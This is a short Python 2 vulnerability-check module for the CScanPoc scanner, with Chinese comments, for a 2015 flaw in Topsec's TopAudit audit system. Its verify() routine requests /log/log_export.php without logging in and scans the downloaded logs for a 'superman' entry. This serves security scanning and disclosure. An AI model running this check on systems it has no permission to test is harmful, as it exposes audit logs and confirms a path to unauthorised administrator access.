# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TOPSEC_0001'  # 平台漏洞编号，留空
    name = '天融信审计系统无需登录可添加任意管理员&未授权下载日志'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-05-28'  # 漏洞公布时间
    desc = '''
        天融信网络卫士安全审计系统TA-W
        天融信网络卫士安全审计系统(TopAudit)
        无需登录可添加任意管理员 和 未授权下载日志。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '天融信审计系统'  # 漏洞应用名称
    product_version = '天融信审计系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '24c9a0b7-3df7-4117-9a56-7ef773970e62'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref http://wooyun.org/bugs/wooyun-2015-0116821
            verify_url = self.target + '/log/log_export.php'
            req = requests.get(verify_url)
            content = req.content

            if req.status_code == 200 and '\tsuperman\t' in content and '<p>' not in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
